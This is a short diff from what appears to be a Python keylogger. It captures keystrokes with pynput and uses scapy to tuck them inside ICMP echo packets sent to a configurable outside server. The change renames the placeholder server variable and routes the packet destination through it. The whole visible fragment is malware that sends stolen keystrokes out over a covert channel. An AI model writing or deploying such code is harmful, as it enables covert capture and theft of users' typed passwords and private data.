@@ -6,12 +6,12 @@ from scapy.all import *
 
 from pynput.keyboard import Key, Listener # type: ignore
 
-dnsServer = "0.0.0.0" #place holder
+server = "0.0.0.0" #place holder
 
 keys = []
 
 def send_packet(keys):
-    ip_layer = IP(dst="0.0.0.0")
+    ip_layer = IP(dst=server)
     icmp_layer = ICMP(type=8)
 
     packet = ip_layer / icmp_layer / str(keys)
